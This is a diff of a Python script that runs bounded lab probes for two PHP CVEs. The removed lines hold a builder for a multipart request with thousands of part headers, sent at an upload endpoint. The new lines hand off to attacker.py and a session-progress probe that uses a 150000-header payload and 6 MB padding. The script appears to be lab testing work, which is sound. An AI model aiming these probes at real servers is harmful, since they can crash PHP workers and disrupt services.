@@ -1,99 +1,70 @@
 #!/usr/bin/env python3
-"""Bounded candidate probes for the two official PHP CVEs.
+"""Compatibility entry point for the maintained, bounded PHP CVE lab probes.
 
-This records request/worker evidence; it does not claim that an HTTP error,
-worker restart, or fatal error alone proves memory corruption or either CVE.
+109618 delegates to attacker.py's multipart parser candidate. 109619 delegates
+to session_progress_probe.py's seeded Session A->B sequence. Neither HTTP
+errors nor worker PID changes alone prove the underlying vulnerability.
 """
 
 import argparse
-import http.client
-import json
-import time
-from urllib.parse import urlsplit
-
-
-BOUNDARY = "php-official-cve-lab"
-
-
-def request(host, port, method, path, body=None, headers=None):
-    started = time.time()
-    connection = http.client.HTTPConnection(host, port, timeout=15)
-    try:
-        connection.request(method, path, body=body, headers=headers or {})
-        response = connection.getresponse()
-        data = response.read(2048)
-        result = {
-            "status": response.status,
-            "worker_pid_header": response.getheader("X-Lab-Worker-Pid"),
-            "body_prefix": data.decode("utf-8", "replace"),
-        }
-    except (OSError, http.client.HTTPException) as exc:
-        result = {"transport_error": type(exc).__name__ + ": " + str(exc)}
-    finally:
-        connection.close()
-    result["elapsed_ms"] = round((time.time() - started) * 1000)
-    return result
-
-
-def multipart_with_part_headers(count):
-    chunks = [
-        f"--{BOUNDARY}\r\n",
-        'Content-Disposition: form-data; name="f"; filename="lab.txt"\r\n',
-    ]
-    chunks.extend(f"X-Lab-{number}: x\r\n" for number in range(count))
-    chunks.append("Content-Type: text/plain\r\n\r\nx\r\n")
-    chunks.append(f"--{BOUNDARY}--\r\n")
-    return "".join(chunks).encode("ascii")
+from pathlib import Path
+import sys
 
 
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("mode", choices=("109618", "109619"))
-    parser.add_argument("--base-url", default="http://127.0.0.1:8088")
-    parser.add_argument("--part-headers", type=int, default=5000,
-                        help="109618 candidate: multipart part header count, 1..50000")
+    parser.add_argument("--base-url", default="http://127.0.0.1:8088",
+                        help="HTTP(S) lab URL, optionally with an application path")
+    parser.add_argument("--part-headers", type=int, default=150000,
+                        help="109618: custom headers in one multipart part (1..150000)")
+    parser.add_argument("--pad-bytes", type=int, default=6 * 1024 * 1024,
+                        help="109619: ordinary form-field padding bytes in producer A")
+    parser.add_argument("--expected-php", default="8.5.11")
+    parser.add_argument("--timeout", type=float, default=15.0)
+    parser.add_argument("--ca-file", type=Path)
+    parser.add_argument("--report", type=Path)
     parser.add_argument("--run", action="store_true",
-                        help="Actually send requests; default is a dry run")
+                        help="Execute the one-shot probe; default is a dry run")
     args = parser.parse_args()
+    if not 1 <= args.part_headers <= 150000:
+        parser.error("--part-headers must be 1..150000")
+    if args.pad_bytes < 1:
+        parser.error("--pad-bytes must be >= 1")
 
-    target = urlsplit(args.base_url)
-    if target.scheme not in ("http", "https") or target.username or target.password or target.query or target.fragment:
-        parser.error("--base-url must be a plain HTTP(S) URL")
-    hostname = target.hostname
-    if not hostname:
-        parser.error("--base-url must include a hostname or IP")
-    if target.path not in ("", "/"):
-        parser.error("--base-url must not include an application path")
-    if not 1 <= args.part_headers <= 50000:
-        parser.error("--part-headers must be between 1 and 50000")
-    port = target.port or (443 if target.scheme == "https" else 80)
-    if not 1 <= port <= 65535:
-        parser.error("port must be between 1 and 65535")
-
-    report = {
-        "mode": args.mode,
-        "target": f"{target.scheme}://{hostname}:{port}",
-        "scope": "candidate input and worker observation only; not CVE proof",
-        "requests": [],
-    }
     if args.mode == "109618":
-        body = multipart_with_part_headers(args.part_headers)
-        report["multipart_part_headers"] = args.part_headers
-        report["body_bytes"] = len(body)
-        if args.run:
-            report["requests"].append({"baseline": request(hostname, port, "GET", "/health.php")})
-            report["requests"].append({"candidate": request(
-                hostname, port, "POST", "/upload.php", body,
-                {"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
-            )})
-            report["requests"].append({"after": request(hostname, port, "GET", "/health.php")})
+        import attacker
+        entry_point = attacker.main
+        delegated = ["attacker.py", "109618", "--target", args.base_url,
+                     "--health", "oom/health.php", "--upload", "oom/upload.php",
+                     "--part-headers", str(args.part_headers),
+                     "--expected-php", args.expected_php]
     else:
-        if args.run:
-            report["requests"].append({"baseline": request(hostname, port, "GET", "/health.php")})
-            report["requests"].append({"fatal_producer": request(hostname, port, "GET", "/fatal.php")})
-            report["requests"].append({"early_consumer": request(hostname, port, "GET", "/health.php")})
-    report["sent"] = args.run
-    print(json.dumps(report, ensure_ascii=False, indent=2))
+        import session_progress_probe
+        entry_point = session_progress_probe.main
+        delegated = [
+            "session_progress_probe.py", "--target", args.base_url,
+            "--health", "session/health.php",
+            "--seed", "session/session-seed.php",
+            "--producer", "session/upload.php",
+            "--consumer", "session/upload.php",
+            "--pad-bytes", str(args.pad_bytes),
+            "--expected-php", args.expected_php,
+        ]
+    delegated.extend(["--timeout", str(args.timeout)])
+    if args.ca_file:
+        delegated.extend(["--ca-file", str(args.ca_file)])
+    if args.report:
+        delegated.extend(["--report", str(args.report)])
+    if args.run:
+        delegated.append("--execute")
+
+    original_argv = sys.argv
+    try:
+        sys.argv = delegated
+        entry_point()
+    finally:
+        sys.argv = original_argv
 
 
 if __name__ == "__main__":
